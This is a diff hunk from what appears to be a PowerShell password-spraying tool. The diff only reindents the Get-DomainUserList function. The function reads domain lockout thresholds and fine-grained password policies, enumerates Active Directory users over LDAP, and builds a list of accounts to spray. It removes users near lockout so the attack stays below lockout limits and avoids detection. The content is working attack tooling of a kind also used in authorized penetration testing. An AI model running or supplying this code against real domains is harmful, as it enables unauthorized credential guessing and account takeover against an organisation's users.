@@ -329,101 +329,101 @@ Function Get-DomainUserList{
                 # adding lockout threshold to array for use later to determine which is the lowest.
                 $AccountLockoutThresholds += $PSOLockoutThreshold
 
-            Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
+                Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
             }
         }
 
     }
 
-        $observation_window = Get-ObservationWindow
+    $observation_window = Get-ObservationWindow
 
-        # Generate a userlist from the domain
-        # Selecting the lowest account lockout threshold in the domain to avoid
-        # locking out any accounts.
-        [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
-        Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
+    # Generate a userlist from the domain
+    # Selecting the lowest account lockout threshold in the domain to avoid
+    # locking out any accounts.
+    [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
+    Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
 
-        if ($SmallestLockoutThreshold -eq "0")
+    if ($SmallestLockoutThreshold -eq "0")
+    {
+        Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
+    }
+    else
+    {
+        Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
+    }
+
+    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
+    $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
+    $UserSearcher.SearchRoot = $DirEntry
+
+    $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
+    $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
+    $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
+
+    If ($RemoveDisabled){
+        Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
+        # More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
+        # LDAP 1.2.840.113556.1.4.803 means bitwise &
+        # uac 0x2 is ACCOUNTDISABLE
+        # uac 0x10 is LOCKOUT
+        # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
+        $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=18))"
+    }
+    else
+    {
+        $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user))"
+    }
+
+    # grab batches of 1000 in results
+    $UserSearcher.PageSize = 1000
+    $AllUserObjects = $UserSearcher.FindAll()
+    Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
+    $UserListArray = @()
+
+    If ($RemovePotentialLockouts)
+    {
+        Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
+        Foreach ($user in $AllUserObjects)
         {
-            Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
-        }
-        else
-        {
-            Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
-        }
-
-        $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
-        $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
-        $UserSearcher.SearchRoot = $DirEntry
-
-        $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
-        $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
-        $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
-
-        If ($RemoveDisabled){
-            Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
-            # More precise LDAP filter UAC check for users that are disabled (Joff Thyer)
-            # LDAP 1.2.840.113556.1.4.803 means bitwise &
-            # uac 0x2 is ACCOUNTDISABLE
-            # uac 0x10 is LOCKOUT
-            # See http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/
-            $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=18))"
-        }
-        else
-        {
-            $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user))"
-        }
-
-        # grab batches of 1000 in results
-        $UserSearcher.PageSize = 1000
-        $AllUserObjects = $UserSearcher.FindAll()
-        Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
-        $UserListArray = @()
-
-        If ($RemovePotentialLockouts)
-        {
-            Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
-            Foreach ($user in $AllUserObjects)
+            # Getting bad password counts and lst bad password time for each user
+            $badcount = $user.Properties.badpwdcount
+            $samaccountname = $user.Properties.samaccountname
+            try
             {
-                # Getting bad password counts and lst bad password time for each user
-                $badcount = $user.Properties.badpwdcount
-                $samaccountname = $user.Properties.samaccountname
-                try
-                {
-                    $badpasswordtime = $user.Properties.badpasswordtime[0]
-                }
-                catch
-                {
-                    continue
-                }
-                $currenttime = Get-Date
-                $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
-                $timedifference = ($currenttime - $lastbadpwd).TotalMinutes
+                $badpasswordtime = $user.Properties.badpasswordtime[0]
+            }
+            catch
+            {
+                continue
+            }
+            $currenttime = Get-Date
+            $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
+            $timedifference = ($currenttime - $lastbadpwd).TotalMinutes
 
-                if ($badcount)
-                {
+            if ($badcount)
+            {
 
-                    [int]$userbadcount = [convert]::ToInt32($badcount, 10)
-                    $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount
-                    # if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
-                    if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
-                    {
-                        $UserListArray += $samaccountname
-                    }
+                [int]$userbadcount = [convert]::ToInt32($badcount, 10)
+                $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount
+                # if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
+                if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
+                {
+                    $UserListArray += $samaccountname
                 }
             }
         }
-        else
+    }
+    else
+    {
+        Foreach ($user in $AllUserObjects)
         {
-            Foreach ($user in $AllUserObjects)
-            {
-                $samaccountname = $user.Properties.samaccountname
-                $UserListArray += $samaccountname
-            }
+            $samaccountname = $user.Properties.samaccountname
+            $UserListArray += $samaccountname
         }
+    }
 
-        Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
-        return $UserListArray
+    Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
+    return $UserListArray
 }
 
 function TestPassword($CurrentDomain, $UserListArray, $Password)
